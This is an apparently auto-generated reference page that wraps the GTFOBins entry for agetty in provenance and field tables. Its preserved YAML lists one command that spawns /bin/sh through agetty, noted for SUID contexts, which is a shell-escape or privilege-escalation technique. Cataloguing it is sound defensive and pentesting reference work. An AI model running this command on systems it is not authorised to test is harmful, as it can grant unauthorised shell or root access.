---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# agetty

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `agetty` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/agetty` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [agetty](../../tools/linux/agetty.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | agetty |
| name | agetty |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/agetty/ |

## Preserved Source Material

```yaml
_body: ''
_name: agetty
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/agetty
functions:
  shell:
  - code: agetty -l /bin/sh -o -p -a root tty
    contexts:
      suid:
        shell: false
```
